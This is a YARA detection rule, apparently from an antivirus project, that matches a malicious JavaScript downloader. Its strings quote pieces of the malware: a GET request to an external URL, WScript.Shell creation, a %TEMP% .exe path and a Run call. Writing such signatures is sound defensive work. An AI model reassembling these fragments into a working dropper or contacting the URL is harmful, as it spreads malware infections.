rule sig_20160330_93ca1a6de5cef4dcbb987bd6cfc54d2f {
  meta:
    description = "datamaliciousorder - file 20160330_93ca1a6de5cef4dcbb987bd6cfc54d2f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "10817c8ed8824ec9f781a8e45f6502180917e3a319c74839460e37ddf37da5d1"

  strings:
    $s1  = "_WF[_T](\"GET\", \"http://rocketsrange.com/b5ksa\", false);" fullword ascii
    $s2  = "var _E0 = function _G() {return WScript[_RQ](\"WScript\"+\".Shell\");}(), _W0 = 11;" fullword ascii
    $s3  = "function _IX(_CK, _FB){_H = _H * 1; return _CK - _FB;};" fullword ascii
    $s4  = "if (_WF[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _VW(){return _SA + \"\";};" fullword ascii
    $s6  = "function _DD() {return _E0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"f2GrV3YuI.ex\" + \"e\";};" fullword ascii
    $s7  = "function _D(_H0){_E0[\"Run\"](_H0, _H, _H);};" fullword ascii
    $s8  = "function _N() {return ((_A0 == true) && (_A0 == _U0)) ? 1 : _H;};" fullword ascii
    $s9  = "function _R(){return 22;};" fullword ascii
    $s10 = "var _M0 = new this[\"Date\"]();" fullword ascii
    $s11 = "function _EE()" fullword ascii
    $s12 = "return _IX(_OL, _M1);" fullword ascii
    $s13 = " while (_A){" fullword ascii
    $s14 = "function _EK(_B) {var _U = (1, 2, 3, 4, 5, _B); return _U;};" fullword ascii
    $s15 = "function _YY(){return _RQ;};" fullword ascii
    $s16 = "_A0 = true; " fullword ascii
    $s17 = "var _A0 = false;" fullword ascii
    $s18 = "var _U0 = false;" fullword ascii
    $s19 = "_U0 = true; " fullword ascii
    $s20 = "var _J = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}